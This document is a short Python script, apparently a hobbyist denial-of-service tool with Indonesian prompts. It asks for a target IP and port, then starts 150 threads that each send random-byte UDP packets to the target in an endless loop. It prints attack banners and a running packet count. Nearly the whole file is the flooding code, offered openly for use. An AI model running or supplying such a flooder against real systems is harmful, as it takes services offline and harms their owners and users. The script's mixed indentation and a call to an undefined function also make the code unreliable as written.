import sys, os, time, socket, random, threading

##########################################

def running(s):
	try:
		for c in s + '\n':
        	    sys.stdout.write(c)
	            sys.stdout.flush()
	            time.sleep(0.001)
	except (KeyboardInterrupt,EOFError):
		run('Error!!')

##########################################

os.system('cls' if os.name == 'nt' else 'clear')
print("""
Ezz Down Dekj...
""")
ip = str(input("• Masukkan IP > "))
port = int(input("• Masukkan PORT > "))
time.sleep(1)
running("[>>] Attacking Started.")
time.sleep(1)
running("...................")
time.sleep(1)
os.system('cls' if os.name == 'nt' else 'clear')

class Bimzzx(threading.Thread):
    def run(self):
    	sent = 0
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            pack = random._urandom(1024)
            bytes = random._urandom(1490)
            sock.sendto(pack, (ip,port))
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            print("Sent %s packet, to ip %s and throught port:%s"%(sent, ip, port))

if __name__ == '__main__':
    try:
        for x in range(150):
            extrash = Bimzzx()
            extrash.start()
            time.sleep(0.1)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        pass
